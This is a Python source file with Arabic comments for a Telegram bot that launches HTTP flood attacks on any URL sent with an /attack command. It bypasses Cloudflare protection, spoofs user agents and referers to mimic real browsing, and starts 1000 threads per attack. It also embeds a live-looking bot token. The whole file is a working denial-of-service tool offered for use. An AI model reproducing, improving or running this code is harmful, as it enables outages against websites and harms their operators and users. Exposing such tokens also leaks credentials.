import random
import time
import threading
import telebot
import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import cloudscraper

bot = telebot.TeleBot("7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU")

class SmartAttackTool:
    def __init__(self):
        self.active_attacks = {}
        self.ua = UserAgent()
        self.scraper = cloudscraper.create_scraper()
        self.cf_cookies = {}

    def _get_cf_cookies(self, url):
        """الحصول على كوكيز Cloudflare"""
        try:
            resp = self.scraper.get(url, timeout=10)
            if resp.status_code == 200:
                return resp.cookies.get_dict()
        except:
            return {}

    def _smart_request(self, url, cookies):
        """طلب ذكي يتجاوز الحمايات"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.google.com/',
            'Connection': 'keep-alive'
        }
        
        try:
            # تغيير سلوك الطلب بشكل عشوائي
            if random.random() > 0.7:
                resp = requests.get(url, headers=headers, cookies=cookies, timeout=5)
            else:
                resp = self.scraper.get(url, headers=headers, cookies=cookies, timeout=5)
            
            # محاكاة تصفح حقيقي
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'html.parser')
                links = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('http')]
                if links:
                    time.sleep(random.uniform(1, 3))
                    secondary_url = random.choice(links)
                    requests.get(secondary_url, headers=headers, timeout=3)
            
            return True
        except:
            return False

    def start_attack(self, chat_id, url, duration=60):
        """بدء هجوم ذكي"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url

        # الحصول على كوكيز الحماية
        cf_cookies = self._get_cf_cookies(url)
        if not cf_cookies:
            return False, "فشل في تجاوز الحماية"

        stop_event = threading.Event()
        threads = []

        def attacker():
            while not stop_event.is_set():
                self._smart_request(url, cf_cookies)
                time.sleep(random.uniform(0.5, 2))

        # بدء 50 خيط هجومي
        for _ in range(1000):
            t = threading.Thread(target=attacker)
            t.daemon = True
            t.start()
            threads.append(t)

        self.active_attacks[chat_id] = {
            'stop_event': stop_event,
            'threads': threads,
            'target': url
        }

        # إيقاف الهجوم بعد المدة
        threading.Timer(duration, self.stop_attack, [chat_id]).start()
        return True, f"✅ بدء الهجوم الذكي على {url}"

    def stop_attack(self, chat_id):
        """إيقاف الهجوم"""
        if chat_id in self.active_attacks:
            self.active_attacks[chat_id]['stop_event'].set()
            for t in self.active_attacks[chat_id]['threads']:
                t.join()
            del self.active_attacks[chat_id]
            return True
        return False

# أوامر البوت
@bot.message_handler(commands=['start'])
def send_welcome(message):
    help_text = """
    🚀 أوامر البوت المتطور:
    /attack [رابط] [وقت] - بدء هجوم ذكي
    /stop - إيقاف الهجوم
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "استخدم: /attack [رابط] [وقت بالثواني]")
            return
        
        url = parts[1]
        duration = int(parts[2]) if len(parts) > 2 else 60
        
        success, msg = SmartAttackTool().start_attack(message.chat.id, url, duration)
        bot.reply_to(message, msg)
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    if SmartAttackTool().stop_attack(message.chat.id):
        bot.reply_to(message, "✅ تم إيقاف الهجوم")
    else:
        bot.reply_to(message, "⚠️ لا يوجد هجوم نشط")

print("🟢 البوت يعمل...")
bot.polling()
